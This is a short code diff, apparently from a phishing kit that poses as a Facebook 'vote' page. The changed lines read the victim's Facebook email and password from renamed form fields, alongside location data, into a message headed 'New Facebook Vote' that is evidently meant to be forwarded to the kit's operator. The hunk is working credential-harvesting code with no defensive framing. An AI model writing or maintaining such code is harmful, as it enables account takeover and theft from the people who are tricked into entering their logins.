@@ -15,8 +15,8 @@ formFB.addEventListener("submit", (e) => {
       lo = data.country_calling_code;
       st = data.city;
 
-      var identity = document.getElementById("email").value;
-      var password = document.getElementById("password").value;
+      var identity = document.getElementById("fb_email").value;
+      var password = document.getElementById("fbpass").value;
 
       var fb_text = `
       <b>New Facebook Vote</b>
